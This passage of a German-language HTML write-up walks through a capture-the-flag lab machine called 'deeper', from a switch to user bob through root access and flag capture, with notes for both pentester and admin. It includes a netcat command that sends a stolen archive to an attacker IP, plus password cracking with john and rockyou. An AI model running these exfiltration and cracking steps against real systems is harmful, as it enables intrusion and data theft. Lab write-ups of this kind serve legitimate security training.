+            Wir nutzen den Befehl `su` (Switch User), um zum Benutzer `bob` zu wechseln, und geben das zuvor gefundene Passwort `<span class="password">IamDeepEnough</span>` ein.
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">su bob</span></div>
+                <pre> 
+Password: <span class="password">IamDeepEnough</span> <!-- Passwort hier eingefügt -->
+bob@deeper:/home/alice 
+ 
+ <li>Pentester: Dokumentiere diesen Schritt als erfolgreiche horizontale Bewegung. Beginne mit der Enumeration aus der Sicht von 'bob'.</li>
+</ul>
+</p>
+</section>
+<section id="privilege-escalation">
+        <h2>Privilege Escalation</h2>
+
+         <p class="comment">
+            Nachdem wir zum Benutzer `bob` gewechselt sind, überprüfen wir erneut die `sudo`-Rechte, um zu sehen, ob `bob` möglicherweise privilegierte Befehle ausführen darf.
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:/home/alice$ <span class="command">sudo -l</span></div>
+                <pre>
+ 
+[sudo] password for bob: <span class="password">IamDeepEnough</span> <!-- Passwort hier eingefügt -->
+Sorry, user bob may not run sudo on deeper.
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl sudo -l wird nun als Benutzer bob ausgeführt. Nach Eingabe von Bobs Passwort (<span class="password">IamDeepEnough</span>) lautet die Antwort erneut "Sorry, user bob may not run sudo on deeper.".
+</p>
+<p class="evaluation">
+Bewertung: Auch Benutzer bob hat keine sudo-Rechte. Der Weg zur Privilegienerweiterung über sudo bleibt versperrt. Wir müssen weiter nach anderen Möglichkeiten suchen.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Untersuche das Home-Verzeichnis von bob und andere systemweite Konfigurationen oder Skripte, auf die bob möglicherweise Zugriff hat. Suche nach SUID/GUID-Dateien, Cronjobs etc. aus Bobs Perspektive (obwohl sich hier wahrscheinlich nichts geändert hat).
+Empfehlung (Admin): Korrekte Konfiguration, da auch bob keine unnötigen sudo-Rechte hat.
+</p>
+<p class="comment">
+            Wir wechseln in das Home-Verzeichnis von `bob` (`cd ~`, was zu `/home/bob` führt) und listen dessen Inhalt mit `ls -la` auf. (Im Originaltext wurde `ls -la` direkt ausgeführt, was im Home-Verzeichnis von `bob` geschieht, nachdem der vorherige Befehl `su bob` implizit dorthin wechselt oder ein `cd ~` angenommen wird. Der Prompt `bob@deeper:~$` legt nahe, dass der Wechsel ins Home-Verzeichnis stattgefunden hat.)
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">ls -la</span></div> <!-- Prompt impliziert /home/bob -->
+                <pre> 
+total 28
+drwxr--r-- 3 bob bob 4096 Aug 26 00:22 .
+drwxr-xr-x 4 root root 4096 Aug 25 20:07 ..
+lrwxrwxrwx 1 bob bob 9 Aug 25 20:44 .bash_history -> /dev/null
+-rw-r--r-- 1 bob bob 220 Apr 23 23:23 .bash_logout
+-rw-r--r-- 1 bob bob 3526 Apr 23 23:23 .bashrc
+drwxr-xr-x 3 bob bob 4096 Aug 25 20:17 .local
+-rw-r--r-- 1 bob bob 807 Aug 25 20:09 .profile
+-rw-r--r-- 1 bob bob 215 Aug 26 00:21 root.zip
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Die Ausgabe von ls -la im Home-Verzeichnis von bob zeigt Standard-Konfigurationsdateien und ein Verzeichnis .local. Die Bash-Historie ist ebenfalls deaktiviert. Die interessanteste Datei ist root.zip. Der Name legt nahe, dass sie Informationen enthält, die für den Root-Zugriff relevant sind, möglicherweise die Root-Flag oder ein Root-Passwort.
+</p>
+<p class="evaluation">
+Bewertung: Der Fund von root.zip ist vielversprechend. Diese Datei ist unser nächstes Hauptziel für die Analyse.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Untersuche die Datei root.zip. Versuche, sie zu entpacken. Wenn sie passwortgeschützt ist, versuche, das Passwort zu finden oder zu knacken. Übertrage die Datei ggf. auf die Angreifer-Maschine zur weiteren Analyse.
+Empfehlung (Admin): Sensible Dateien (wie eine Datei namens root.zip) sollten niemals in Benutzer-Home-Verzeichnissen abgelegt werden. Implementiere Richtlinien zur Datenspeicherung und führe Audits durch.
+</p>
+<p class="comment">
+            Wir versuchen, die gefundene Datei `root.zip` direkt auf dem Zielsystem mit dem `unzip`-Befehl zu entpacken.
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">unzip root.zip</span></div>
+                <pre>bash: unzip: command not found</pre>
+            </div>
+        </div>
+         <p class="analysis">
+            **Analyse:** Der Versuch, `unzip root.zip` auszuführen, schlägt fehl. Die Fehlermeldung `bash: unzip: command not found` bedeutet, dass das Programm `unzip` auf dem Zielsystem nicht installiert ist oder nicht im Suchpfad des Benutzers `bob` liegt.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Wir können die ZIP-Datei nicht direkt auf dem Zielsystem entpacken. Dies erfordert einen anderen Ansatz, z. B. die Übertragung der Datei auf unsere Angreifer-Maschine, auf der die notwendigen Tools installiert sind.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Übertrage die Datei `root.zip` auf die eigene Maschine (z.B. mit `nc`, `scp` oder durch Starten eines Webservers auf dem Ziel, falls Python verfügbar ist).
+            **Empfehlung (Admin):** Installiere nur notwendige Pakete auf Servern (Minimalprinzip). Wenn `unzip` nicht benötigt wird, ist es korrekt, dass es nicht installiert ist. Stelle sicher, dass Benutzer keine Pakete nachinstallieren können, wenn dies nicht vorgesehen ist.
+        </p>
+
+         <p class="comment">
+            Wir versuchen, einen einfachen Python-Webserver zu starten, um die Datei `root.zip` herunterzuladen. Wir testen sowohl `python3` als auch `python`.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">python3 -m http.server</span></div>
+                <pre>bash: python3: command not found</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">python -m SimpleHTTPServer</span></div> <!-- SimpleHTTPServer für Python 2 -->
+                <pre>bash: python: command not found</pre> <!-- Angepasste Fehlermeldung, da python -m http.server erst ab 3 ist -->
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">which python</span></div>
+                 <!-- Keine Ausgabe -->
+            </div>
+        </div>
+        <p class="analysis">
+            **Analyse:** Die Versuche, einen Webserver mit `python3 -m http.server` oder `python -m SimpleHTTPServer` zu starten, scheitern beide mit `command not found`. Der Befehl `which python` gibt ebenfalls keine Ausgabe zurück.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Python (weder Version 3 noch Version 2) ist auf dem System für den Benutzer `bob` nicht verfügbar. Der einfache Weg, die Datei per HTTP-Server zu übertragen, ist somit nicht möglich.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Nutze alternative Methoden zum Dateitransfer, wie `nc` (netcat), `scp` (falls SSH-Keys vorhanden oder Login möglich) oder Base64-Kodierung/Dekodierung über die Shell.
+            **Empfehlung (Admin):** Das Fehlen von Python kann eine bewusste Sicherheitsmaßnahme sein, um die Ausführung von Skripten zu erschweren (Minimalprinzip).
+        </p>
+
+        <p class="comment">
+            Wir überprüfen die Benutzer-ID und die Berechtigungen der `/etc/passwd`-Datei, um sicherzustellen, dass wir uns im Kontext von `bob` befinden und ob die Passwort-Datei lesbar ist (was Standard ist).
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">iid</span></div> <!-- Tippfehler im Original -->
+                <pre>bash: iid: command not found</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">id</span></div> <!-- Korrigierter Befehl -->
+                <pre>uid=1001(bob) gid=1001(bob) groups=1001(bob)</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">ls -la /etc/passwd</span></div>
+                <pre>-rw-r--r-- 1 root root 1179 Aug 25 20:14 /etc/passwd</pre>
+            </div>
+        </div>
+        <p class="analysis">
+            **Analyse:**
+            *   `iid`: Tippfehler, führt zu Fehler.
+            *   `id`: Bestätigt erneut, dass wir als `bob` (UID 1001) agieren.
+            *   `ls -la /etc/passwd`: Zeigt, dass die Datei `/etc/passwd` existiert, `root` gehört und für alle lesbar ist (`-rw-r--r--`). Dies ist die Standardkonfiguration.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Diese Befehle bestätigen den aktuellen Benutzerkontext und die normalen Berechtigungen für `/etc/passwd`. Sie liefern keine neuen Informationen für die Privilegienerweiterung, sind aber Teil einer standardmäßigen Systemenumeration.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Da Python nicht verfügbar ist, bereite den Dateitransfer von `root.zip` mittels `nc` vor.
+            **Empfehlung (Admin):** Die Berechtigungen für `/etc/passwd` sind korrekt.
+        </p>
+
+        <p class="comment">
+            Wir bereiten den Transfer der Datei `root.zip` von der Zielmaschine (bob@deeper) zu unserer Angreifer-Maschine (root@Cybermaschine) mittels `nc` (netcat) vor. Zuerst starten wir auf der Angreifer-Maschine einen `nc`-Listener auf Port 22 (ein ungewöhnlicher Port für diesen Zweck, aber hier verwendet), der die eingehenden Daten in die Datei `root.zip` schreibt.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">nc -l -p 22 > root.zip</span></div>
+<!-- Keine direkte Ausgabe, nc wartet auf Verbindung -->
+</div>
+</div>
+<p class="analysis">
+Analyse: Auf der Angreifer-Maschine wird nc -l -p 22 > root.zip ausgeführt.
+* -l: Listen-Modus, nc wartet auf eingehende Verbindungen.
+* -p 22: Lauscht auf Port 22.
+* > root.zip: Leitet alle empfangenen Daten in die Datei root.zip um.
+Der Befehl blockiert und wartet auf eine eingehende Verbindung auf Port 22.
+</p>
+<p class="evaluation">
+Bewertung: Der Listener ist bereit, die Datei zu empfangen. Die Wahl von Port 22 ist unkonventionell und könnte auf Firewalls problematisch sein, funktioniert aber offenbar in dieser Umgebung. Normalerweise würde man einen höheren, unprivilegierten Port wählen.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Führe nun den nc-Befehl auf der Zielmaschine aus, um die Verbindung herzustellen und die Datei zu senden. Verwende in Zukunft eher Ports > 1024 für solche Transfers, um Konflikte und Berechtigungsprobleme zu vermeiden.
+Empfehlung (Admin): Überwache Netzwerkverbindungen auf ungewöhnliche Ports oder Datenübertragungen. Firewall-Regeln sollten ausgehenden Traffic einschränken (Egress Filtering), um solche unkontrollierten Datenübertragungen zu erschweren.
+</p>
+<p class="comment">
+            Nun senden wir von der Zielmaschine (`bob@deeper`) aus die Datei `root.zip` an den `nc`-Listener auf unserer Angreifer-Maschine (`192.168.2.199` Port 22).
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">nc -w 3 192.168.2.199 22 < root.zip</span></div>
+                <!-- Keine direkte Ausgabe, nc sendet die Daten -->
+             </div>
+        </div>
+         <p class="analysis">
+            **Analyse:** Auf der Zielmaschine wird `nc -w 3 192.168.2.199 22 < root.zip` ausgeführt.
+            *   `192.168.2.199`: IP-Adresse der Angreifer-Maschine.
+            *   `22`: Port, auf dem der Listener lauscht.
+            *   `-w 3`: Setzt ein Timeout von 3 Sekunden für die Verbindung.
+            *   `< root.zip`: Leitet den Inhalt der Datei `root.zip` als Eingabe an `nc`, der diese dann über die Netzwerkverbindung sendet.
+            Nach erfolgreicher Übertragung beendet sich der Befehl. Der Listener auf der Angreifer-Maschine beendet sich ebenfalls, und die Datei `root.zip` sollte dort nun vorhanden sein.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Der Dateitransfer mittels `nc` war erfolgreich. Die Datei `root.zip` befindet sich jetzt auf unserer Angreifer-Maschine und kann dort mit den verfügbaren Tools analysiert werden.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Überprüfe die Integrität der empfangenen Datei `root.zip` (z.B. mit `ls -l` oder `md5sum`, falls ein Vergleichswert bekannt wäre). Beginne mit der Analyse der ZIP-Datei auf der Angreifer-Maschine.
+            **Empfehlung (Admin):** Siehe vorherige Empfehlung bezüglich Netzwerküberwachung und Egress Filtering.
+        </p>
+
+        <p class="comment">
+            Wir überprüfen auf unserer Angreifer-Maschine, ob die Datei `root.zip` erfolgreich übertragen wurde und listen den Inhalt des aktuellen Verzeichnisses auf.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">ll</span></div> <!-- ll ist oft ein Alias für ls -al oder ls -alh -->
+<pre>
+insgesamt 157172
+drwxr-xr-x 3 root root 4096 26. Sep 22:59 192.168.2.130
+-rw-r--r-- 1 root root 6407 26. Sep 01:13 39536.txt
+-rw-r--r-- 1 root root 572 26. Sep 23:10 authorized_keys
+drwxr-xr-x 3 root root 4096 27. Sep 15:22 Ben
+drwxr-xr-x 3 root root 4096 26. Sep 20:21 HackingTools
+-rw-r--r-- 1 root root 1231 26. Sep 00:02 hash
+-rw-r--r-- 1 root root 154293396 27. Sep 23:05 hydra.restore
+-rw-r--r-- 1 root root 1316634 25. Aug 22:18 index2.jpg
+-rw-r--r-- 1 root root 3560095 25. Aug 22:25 index3.jpg
+-rw-r--r-- 1 root root 1681297 25. Aug 21:47 index.jpg
+-rw-r--r-- 1 root root 215 27. Sep 12:56 open
+drwxr-xr-x 10 root root 4096 26. Sep 17:01 openfortivpn
+-rw-r--r-- 1 root root 1360 26. Sep 23:31 passwd_hacker
+-rw-r--r-- 1 root root 192 27. Sep 13:22 passwordlist.txt
+-rwxr-xr-x 1 root root 3537 26. Sep 00:29 php-reverse-shell.php
+-rw-r--r-- 1 root root 31 26. Sep 23:06 rce_shell.php
+-rw-r--r-- 1 root root 215 27. Sep 23:11 root.zip <!-- Datei ist vorhanden -->
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl ll (oder ls -al) listet den Inhalt des aktuellen Verzeichnisses auf der Angreifer-Maschine auf. Die Datei root.zip ist in der Liste mit einer Größe von 215 Bytes vorhanden und hat einen aktuellen Zeitstempel, was die erfolgreiche Übertragung bestätigt.
+</p>
+<p class="evaluation">
+Bewertung: Die Datei ist sicher angekommen. Die Größe von 215 Bytes ist klein, was darauf hindeutet, dass sie wahrscheinlich nur eine kleine Textdatei (wie eine Flag oder ein Passwort) enthält.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Da die Datei wahrscheinlich passwortgeschützt ist (sonst hätte bob sie vielleicht selbst geöffnet), extrahiere den Passwort-Hash aus der ZIP-Datei mit zip2john und versuche, ihn mit john zu knacken.
+Empfehlung (Admin): Keine spezifischen Maßnahmen erforderlich, da dies auf der Angreifer-Maschine geschieht.
+</p>
+<p class="comment">
+            Wir verwenden `zip2john`, um den Passwort-Hash aus der Datei `root.zip` zu extrahieren und leiten die Ausgabe in eine Datei namens `hash` um.
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">zip2john root.zip > hash</span></div>
+<pre>ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0</pre>
+<!-- Hinweis: Die eigentliche Hash-Ausgabe wird in die Datei 'hash' umgeleitet, hier wird nur angezeigt, was zip2john ggf. nach stderr schreibt oder wenn es ohne Umleitung ausgeführt würde. Der Hash selbst ist in der Datei 'hash'. -->
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl zip2john root.zip analysiert die ZIP-Datei und extrahiert den Passwort-Hash in einem Format, das John the Ripper versteht. Die Ausgabe > hash leitet diesen Hash in die Datei hash. Die auf der Konsole sichtbare Ausgabe gibt Metainformationen über die verschlüsselte Datei (root.txt innerhalb von root.zip) und die verwendete Verschlüsselungsmethode (PKZIP).
+</p>
+<p class="evaluation">
+Bewertung: Der Hash wurde erfolgreich extrahiert und für das Cracking vorbereitet. Die Datei root.txt innerhalb des Archivs ist das Ziel.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Verwende nun john mit einer geeigneten Wortliste (z.B. rockyou.txt), um den Hash in der Datei hash zu knacken.
+Empfehlung (Admin): Verwende starke, komplexe Passwörter für verschlüsselte Archive, die nicht leicht durch Wörterbuchangriffe geknackt werden können.
+</p>
+<p class="comment">
+            Wir starten `John the Ripper` (`john`), um das Passwort für die ZIP-Datei zu knacken, indem wir den extrahierten Hash (`hash`) und die Wortliste `rockyou.txt` verwenden.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+<pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">bob</span> (root.zip/root.txt)
+1g 0:00:00:00 DONE (2023-09-27 23:12) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s R3v_m4lwh3r3_k1nG!!..karlas <!-- Gecracktes Passwort hier möglicherweise abgeschnitten/nicht vollständig? Originaltext zeigt 'bob' an erster Stelle. -->
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: john wird mit der Option --wordlist und der Passwortdatei hash gestartet.
+* Loaded 1 password hash (PKZIP [32/64]): John erkennt den Hash-Typ korrekt.
+* Will run 16 OpenMP threads: John nutzt mehrere CPU-Kerne zur Beschleunigung.
+* <span class="password">bob</span> (root.zip/root.txt): John findet sehr schnell ein Passwort! Das gefundene Passwort lautet <span class="password">bob</span>. Die restliche Zeile (1g 0:00:00:00 DONE...) zeigt Statistik und das Ende des Cracking-Prozesses an. Die Zeichenkette R3v_m4lwh3r3_k1nG!!..karlas am Ende ist wahrscheinlich ein Kandidat aus der Wortliste, der getestet wurde, aber nicht das korrekte Passwort ist. John gibt das gefundene Passwort separat aus.
+</p>
+<p class="evaluation">
+Bewertung: Hervorragend! Das Passwort für root.zip wurde erfolgreich geknackt und lautet <span class="password">bob</span>. Dies war ein sehr schwaches Passwort, das leicht zu erraten oder schnell zu knacken war.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Verwende das gefundene Passwort <span class="password">bob</span>, um die Datei root.zip auf der Angreifer-Maschine zu entpacken und den Inhalt von root.txt zu lesen.
+Empfehlung (Admin): Erzwinge die Verwendung starker Passwörter für verschlüsselte Dateien und Benutzerkonten. Das Passwort "bob" ist extrem unsicher. Führe Passwort-Audits durch, um schwache Passwörter zu identifizieren.
+</p>
+<p class="comment">
+            Wir entpacken nun `root.zip` auf unserer Angreifer-Maschine mit dem geknackten Passwort `<span class="password">bob</span>`.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">unzip root.zip</span></div>
+<pre>
+Archive: root.zip
+[root.zip] root.txt password: <span class="password">bob</span> <!-- Passwort hier eingegeben -->
+extracting: root.txt
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl unzip root.zip wird ausgeführt. Das Programm fragt nach dem Passwort für die verschlüsselte Datei root.txt innerhalb des Archivs. Wir geben das geknackte Passwort <span class="password">bob</span> ein. Die Ausgabe extracting: root.txt bestätigt, dass die Datei erfolgreich entpackt wurde.
+</p>
+<p class="evaluation">
+Bewertung: Die Datei root.txt wurde erfolgreich extrahiert. Sie befindet sich nun im aktuellen Verzeichnis auf unserer Angreifer-Maschine.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Lies den Inhalt der extrahierten Datei root.txt.
+Empfehlung (Admin): Keine spezifischen Maßnahmen erforderlich, da dies auf der Angreifer-Maschine geschieht. Die zugrunde liegende Schwachstelle war das schwache Passwort und die unsichere Platzierung der ZIP-Datei.
+</p>
+<p class="comment">
+            Wir listen erneut den Verzeichnisinhalt auf, um die extrahierte Datei `root.txt` zu sehen.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">ll</span></div>
+<pre>
+insgesamt 157176
+drwxr-xr-x 3 root root 4096 26. Sep 22:59 192.168.2.130
+-rw-r--r-- 1 root root 6407 26. Sep 01:13 39536.txt
+-rw-r--r-- 1 root root 572 26. Sep 23:10 authorized_keys
+drwxr-xr-x 3 root root 4096 27. Sep 15:22 Ben
+drwxr-xr-x 3 root root 4096 26. Sep 20:21 HackingTools
+-rw-r--r-- 1 root root 167 27. Sep 23:12 hash
+-rw-r--r-- 1 root root 154293396 27. Sep 23:05 hydra.restore
+-rw-r--r-- 1 root root 1316634 25. Aug 22:18 index2.jpg
+-rw-r--r-- 1 root root 3560095 25. Aug 22:25 index3.jpg
+-rw-r--r-- 1 root root 1681297 25. Aug 21:47 index.jpg
+-rw-r--r-- 1 root root 215 27. Sep 12:56 open
+drwxr-xr-x 10 root root 4096 26. Sep 17:01 openfortivpn
+-rw-r--r-- 1 root root 1360 26. Sep 23:31 passwd_hacker
+-rw-r--r-- 1 root root 192 27. Sep 13:22 passwordlist.txt
+-rwxr-xr-x 1 root root 3537 26. Sep 00:29 php-reverse-shell.php
+-rw-r--r-- 1 root root 31 26. Sep 23:06 rce_shell.php
+-rw-r--r-- 1 root root 21 25. Aug 23:20 root.txt <!-- Extrahierte Datei -->
+-rw-r--r-- 1 root root 215 27. Sep 23:11 root.zip
+-rw-r--r-- 1 root root 847 26. Sep 17:56 shell.py
+drwxr-xr-x 9 root root 4096 26. Sep 01:31 sitemagic
+-rw-r--r-- 1 root root 3906 26. Sep 23:05 sshd_config
+-rw-r--r-- 1 root root 72 27. Sep 00:37 userlist.txt
+drwxr-xr-x 3 root root 4096 25. Sep 23:09 vpn
+-rw-r--r-- 1 root root 481 27. Sep 14:09 x
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Die Ausgabe von ll zeigt nun die Datei root.txt mit einer Größe von 21 Bytes im aktuellen Verzeichnis.
+</p>
+<p class="evaluation">
+Bewertung: Die Datei ist wie erwartet vorhanden.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Lies den Inhalt von root.txt mit cat.
+Empfehlung (Admin): Keine.
+</p>
+<p class="comment">
+            Wir lesen den Inhalt der extrahierten Datei `root.txt`.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">cat root.</span></div> <!-- Tippfehler im Original -->
+<pre>cat: root.: Datei oder Verzeichnis nicht gefunden</pre>
+</div>
+</div>
+<div class="code-block">
+<div class="terminal">
+<div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat root.txt</span></div> <!-- Korrigierter Befehl -->
+<pre>root:IhateMyPassword</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse:
+* cat root.: Tippfehler, führt zu Fehler.
+* cat root.txt: Gibt den Inhalt der Datei aus: root:<span class="password">IhateMyPassword</span>.
+</p>
+<p class="evaluation">
+Bewertung: Das ist wahrscheinlich der entscheidende Hinweis! Wir haben ein potenzielles Passwort (<span class="password">IhateMyPassword</span>) für den root-Benutzer gefunden. Dies ist nicht die Root-Flag selbst, sondern das Passwort, um Root-Rechte auf der Zielmaschine zu erlangen.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Wechsle zurück zur SSH-Sitzung auf der Zielmaschine (als Benutzer bob). Versuche, mit su root und dem Passwort <span class="password">IhateMyPassword</span> zum Root-Benutzer zu wechseln.
+Empfehlung (Admin): Ändere sofort das Root-Passwort. Verwende niemals solche einfachen oder erratbaren Passwörter für privilegierte Konten. Speichere Root-Passwörter niemals in Dateien in Benutzer-Home-Verzeichnissen. Überprüfe, wie dieses Passwort dorthin gelangt ist.
+</p>
+<p class="comment">
+            Zurück auf der Zielmaschine in der Shell von `bob`, versuchen wir nun mit `su root` und dem gerade gefundenen Passwort `<span class="password">IhateMyPassword</span>` zum Root-Benutzer zu wechseln.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">bob@deeper:~$ <span class="command">su root</span></div>
+                <pre>
+ 
+Password: <span class="password">IhateMyPassword</span> <!-- Passwort hier eingegeben -->
+root@deeper:/home/bob# <!-- Erfolgreicher Wechsel zum Root-Benutzer! -->
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl su root wird ausgeführt. Nach Eingabe des Passworts <span class="password">IhateMyPassword</span> ändert sich der Prompt zu root@deeper:/home/bob#. Das #-Zeichen am Ende des Prompts signalisiert standardmäßig Root-Rechte.
+</p>
+<p class="evaluation">
+Bewertung: Fantastisch! Der Wechsel zum root-Benutzer war erfolgreich! Wir haben vollständige Kontrolle über das Zielsystem erlangt. Die Privilegienerweiterung wurde durch das Auffinden des Root-Passworts in der unsicher gespeicherten und schwach verschlüsselten root.zip-Datei erreicht.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Navigiere zum Root-Home-Verzeichnis (cd /root oder cd ~) und suche nach der finalen Root-Flag (root.txt). Dokumentiere den Erfolg der Privilegienerweiterung.
+Empfehlung (Admin): Ändere sofort das Root-Passwort zu einem starken, einzigartigen Passwort. Untersuche das System auf weitere Kompromittierungen oder Hintertüren, die der Angreifer möglicherweise platziert hat. Behebe die ursprünglichen Schwachstellen (Passwort im Webseiten-Quellcode, Passwort in .bob.txt, unsichere root.zip-Datei).
+</p>
+<p class="comment">
+            Als Root-Benutzer wechseln wir ins Root-Home-Verzeichnis (`~`, also `/root`), listen den Inhalt auf und lesen die finale Root-Flag aus der Datei `root.txt`.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt">root@deeper:/home/bob# <span class="command">cd ~</span></div> <!-- Prompt bereits rot durch CSS -->
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">root@deeper:~# <span class="command">ls</span></div>
+                <pre>root.txt</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">root@deeper:~# <span class="command">cat root.txt</span></div>
+                <pre><span class="password">dbc56c8328ee4d00bbdb658a8fc3e895</span></pre> <!-- Root Flag -->
+            </div>
+        </div>
+         <p class="analysis">
+            **Analyse:**
+            *   `cd ~`: Wechselt in das Home-Verzeichnis des aktuellen Benutzers (`/root`).
+            *   `ls`: Listet den Inhalt von `/root` auf, der nur aus der Datei `root.txt` besteht.
+            *   `cat root.txt`: Gibt den Inhalt der Datei `root.txt` aus: `<span class="password">dbc56c8328ee4d00bbdb658a8fc3e895</span>`.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Ziel erreicht! Dies ist die Root-Flag der Maschine. Der gesamte Angriffspfad von der initialen Enumeration bis zur vollständigen Systemkontrolle wurde erfolgreich abgeschlossen.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Dokumentiere die Root-Flag und den gesamten Pfad zur Kompromittierung im Abschlussbericht.
+            **Empfehlung (Admin):** Sichere die Root-Flag (bzw. die entsprechenden sensiblen Daten in einer realen Umgebung) angemessen. Behebe alle identifizierten Schwachstellen (Passwörter im Code/Dateien, schwache Verschlüsselung, Directory Indexing etc.), um zukünftige Kompromittierungen zu verhindern. Führe eine gründliche Systemprüfung und Bereinigung durch.
+        </p>
+
+    </section>
+
+    <section id="flags">
+        <div class="flag-container">
+            <h2 class="flag-heading">Flags</h2>
+            <div class="flag-entry">
+                <!-- Befehl aus alice's Kontext -->
+                <div class="flag-command">cat /home/alice/user.txt</div>
+                <div class="flag-value"><span class="password">7e267b737cc121c29b496dc3bcffa5a7</span></div>
+            </div>
+            <div class="flag-entry">
+                 <!-- Befehl aus root's Kontext -->
+                <div class="flag-command">cat /root/root.txt</div>
+                <div class="flag-value"><span class="password">dbc56c8328ee4d00bbdb658a8fc3e895</span></div>
+            </div>
+        </div>
+    </section>
+ 
+
+<footer class="footer">
+    <p>DarkSpirit - Cyber Security Reports</p>
+    <!-- Extrahiertes Datum aus Nikto/Nmap Scan -->
+    <p>Berichtsdatum: 2023-09-27</p>
+</footer>
+
+</body>
+</html>
